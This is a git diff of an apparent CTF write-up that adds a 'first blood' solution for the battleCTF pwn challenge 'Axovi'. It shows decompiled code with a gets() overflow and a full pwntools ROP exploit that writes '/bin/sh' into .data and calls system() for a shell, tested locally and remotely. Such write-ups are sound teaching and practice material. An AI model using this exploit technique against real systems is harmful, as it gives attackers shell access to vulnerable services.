@@ -1086,7 +1086,7 @@ The offset is 56 but now the issue is that we need to make the base pointer a kn
 I just used the .data section 
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/490c0d60-a0ae-4bc8-a704-385f7dbb9432)
 
-With that set here's my solve [script]()
+With that set here's my solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/battlectf23/prequal/pwn/youpi/solve.py)
 
 ```python
 #!/usr/bin/python3
@@ -1146,4 +1146,123 @@ Running it remotely works
 
 ```
 Flag: battleCTF{Right_jump_860332b9b9c47839ec975f0ecb32a51e}
+```
+
+#### Axovi [First Blood 🩸]
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/efe83823-4bc9-4757-9691-d9bbd95faba7)
+
+After downloading the attached file and unzipping it I got the binary
+
+Let us check the file type and the protection enabled on it
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7af56a69-0234-4c14-9acd-4093c46dadaa)
+
+It's a x64 binary which is dynamically linked and not stripped and the only protection enabled on it is NX (No-Execute)
+
+Since the source code isn't given i'll decompile it using IDA
+
+Here's the main function
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dfcbbffd-9987-459d-9d4e-ba95b702527c)
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[48]; // [rsp+0h] [rbp-30h] BYREF
+
+  system("echo 'Welcome to Africa battleCTF.\nTell us something about : '");
+  gets(v4, argv);
+  return 0;
+}
+```
+
+We can see that it uses `system` to print some text and then use gets() to receive our input
+
+So we have a buffer overflow here
+
+Also the issue is that since system is used and system is called from the global offset table (GOT) we won't need to calculate the libc base address therefore we can call system directly 🙂
+
+Let us get the offset needed to overwrite the RIP
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2530e8a2-3846-4a25-8fbb-808155b103a9)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ffe9e6d0-1e62-4424-9f42-177b46d510ad)
+
+The offset is 56
+
+But now we know that we can call system but we can't directly use a string as it's parameter but instead a memory address 
+
+So we can get a writable section of the binary preferably `.data` and put `/bin/sh` into it therefore ropping to `system()`
+
+I used rabin2 to get the .data section address
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c490cf43-9c6e-4b05-b575-f24c95fec3f7)
+
+Also we would need a pop rdi gadget since x64 argument are passed in via registers
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b7413529-5ff9-4fd2-bf30-4269740046bf)
+
+Now that it is settled here's what I'll do:
+- Call gets() and our input will be stored in .data
+- Call system(.data)
+
+Here's my exploit [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/battlectf23/prequal/pwn/axovi/solve.py)
+
+```python
+#!/usr/bin/python3
+from pwn import *
+import warnings
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+# Binary filename
+exe = './axovi'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'info'
+warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Start program
+io = start()
+
+offset = 56
+
+data = 0x000000000404028 # data section
+pop_rdi = 0x00000000004011bb # pop rdi; ret;
+
+payload = flat({
+    offset: [
+        pop_rdi,
+        data,
+        elf.plt['gets'],
+        pop_rdi,
+        data,
+        elf.plt['system']
+]
+})
+
+io.sendline(payload)
+io.interactive()
+```
+
+Running it works locally
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b4888b63-0a26-47f9-bb1a-383733ec8528)
+
+And it works remotely also
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/af78be66-93e5-439c-8a3c-798e0540a6e3)
+
+```
+Flag: battleCTF{ROP_sw33t_R0P}
 ```
